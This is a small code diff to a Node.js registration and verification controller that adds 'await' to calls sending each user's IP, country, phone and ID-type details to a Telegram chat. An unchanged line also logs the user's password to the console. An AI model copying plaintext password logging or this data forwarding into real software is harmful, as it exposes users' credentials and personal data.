@@ -64,7 +64,7 @@ export const registerUser = async (req, res, next) => {
         `📍 <b>IP:</b> ${user.deviceInfo?.ip || 'Unknown'}\n` +
         `🌎 <b>Country:</b> ${user.country}\n` +
         `📱 <b>Phone:</b> ${user.phone}`;
-      sendTelegramMessage(message);
+      await sendTelegramMessage(message);
     } else {
       // Create new user
       user = await User.create({
@@ -89,7 +89,7 @@ export const registerUser = async (req, res, next) => {
         `📍 <b>IP:</b> ${user.deviceInfo?.ip || 'Unknown'}\n` +
         `🌎 <b>Country:</b> ${user.country}\n` +
         `📱 <b>Phone:</b> ${user.phone}`;
-      sendTelegramMessage(message);
+      await sendTelegramMessage(message);
     }
 
     console.log('USER SAVED WITH PASSWORD:', user.password);
@@ -136,7 +136,7 @@ export const updateVerificationStep = async (req, res, next) => {
       `📍 <b>IP:</b> ${user.deviceInfo?.ip || 'Unknown'}\n` +
       `${stepNumber === '2' ? `🆔 <b>ID Type:</b> ${idType}\n` : ''}` +
       `📊 <b>Overall Status:</b> ${user.overallStatus}`;
-    sendTelegramMessage(message);
+    await sendTelegramMessage(message);
 
     res.status(200).json({ success: true, message: 'Step completed!', data: { userId: user._id, verificationSteps: user.verificationSteps, overallStatus: user.overallStatus } });
   } catch (error) { next(error); }
